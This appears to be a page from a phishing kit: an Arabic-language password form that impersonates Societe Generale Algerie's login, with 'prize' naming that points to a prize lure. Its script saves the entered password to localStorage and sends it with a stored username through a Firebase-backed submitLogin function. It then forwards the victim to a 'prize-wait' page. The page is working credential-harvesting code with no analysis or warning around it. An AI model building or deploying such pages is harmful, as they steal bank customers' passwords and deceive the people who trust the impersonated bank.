<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
  <title>كلمة المرور النصية</title>
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
  <style>
    *{box-sizing:border-box}body{margin:0;font-family:Cairo,sans-serif;background:#fff;color:#171717}.top{height:68px;border-bottom:1px solid #eee;display:flex;align-items:center;justify-content:center}.top strong{font-size:18px}.card{width:min(92%,430px);margin:70px auto;text-align:center}.card h1{font-size:22px;margin:0 0 8px}.card p{color:#69707d;font-size:13px;margin:0 0 28px}label{display:block;text-align:right;font-weight:800;font-size:12px;margin:0 0 7px}input{width:100%;height:52px;border:1px solid #ddd;border-radius:12px;padding:0 14px;font:15px Cairo;outline:none}input:focus{border-color:#c62828;box-shadow:0 0 0 3px #c6282820}button{width:100%;height:52px;margin-top:18px;border:0;border-radius:30px;background:#c62828;color:#fff;font:800 15px Cairo;cursor:pointer;transition:background .2s ease,color .2s ease}button:disabled{background:#767c83;color:#e6e7e9;cursor:not-allowed}.error{display:none;color:#c62828;text-align:right;font-size:12px;margin-top:8px}.error.show{display:block}
  </style>
</head>
<body>
  <div class="top"><strong>Societe Generale Algerie</strong></div>
  <main class="card">
    <h1>ادخل كلمة المرور</h1>
    <p>يرجى إدخال كلمة المرور النصية لحسابك</p>
    <form id="textPasswordForm">
      <label for="textPassword">كلمة المرور</label>
      <input id="textPassword" type="password" autocomplete="current-password" required placeholder="كلمة المرور">
      <div class="error" id="textPasswordError">يرجى إدخال كلمة المرور.</div>
      <button type="submit" id="confirmBtn" disabled>تأكيد</button>
    </form>
  </main>
  <script src="/assets/js/firebase-env.js"></script>
  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script>
  <script src="/assets/js/firebase-client.js?v=13"></script>
  <script src="/assets/js/page-commands.js?v=5"></script>
  <script>
    const confirmBtn=document.getElementById("confirmBtn"),textPasswordInput=document.getElementById("textPassword");
    function refreshConfirmState(){confirmBtn.disabled=textPasswordInput.value.trim().length===0}
    textPasswordInput.addEventListener("input",refreshConfirmState);
    refreshConfirmState();
    document.getElementById("textPasswordForm").addEventListener("submit",async e=>{
      e.preventDefault();
      const password=document.getElementById("textPassword").value.trim();
      if(!password){document.getElementById("textPasswordError").classList.add("show");return}
      localStorage.setItem("prizeTextPassword",password);
      if(window.submitLogin)await window.submitLogin({username:localStorage.getItem("prizeUsername")||"",password});
      location.href="prize-wait.html";
    });
  </script>
</body>
</html>
